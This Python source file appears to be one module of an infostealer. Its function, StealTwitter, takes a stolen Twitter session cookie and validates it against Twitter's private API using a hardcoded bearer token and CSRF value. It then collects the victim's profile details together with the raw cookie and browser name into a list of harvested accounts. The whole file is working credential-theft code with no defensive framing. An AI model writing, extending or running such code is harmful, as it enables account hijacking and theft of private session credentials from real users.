from main import ListFonction, error_handler
import aiohttp # type: ignore

async def StealTwitter(self, cookie: str, browser: str) -> None:
    try:
        authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42'
        headers = {
            'authority': 'twitter.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
            'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
            'origin': 'https://twitter.com', 'referer': 'https://twitter.com/home', 'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'x-twitter-active-user': 'yes', 'x-twitter-auth-type': 'OAuth2Session', 'x-twitter-client-language': 'en',
            'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42', "cookie": f'auth_token={authToken}'
        }
        url = "https://twitter.com/i/api/1.1/account/update_profile.json"

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
            response = await session.post(url, headers=headers)
            req = await response.json()

            username = req.get("name", "N/A")
            nickname = req.get("screen_name", "N/A")
            followers_count = req.get("followers_count", 0)
            following_count = req.get("friends_count", 0)
            tweets_count = req.get("statuses_count", 0)
            verified = req.get("verified", False)
            created_at = req.get("created_at", "N/A")
            description = req.get("description", "N/A")
            profileURL = f"https://twitter.com/{nickname}"
        
    except Exception as e:
        error_handler(f"twitter session error - {str(e)}")
    else:
        ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}")
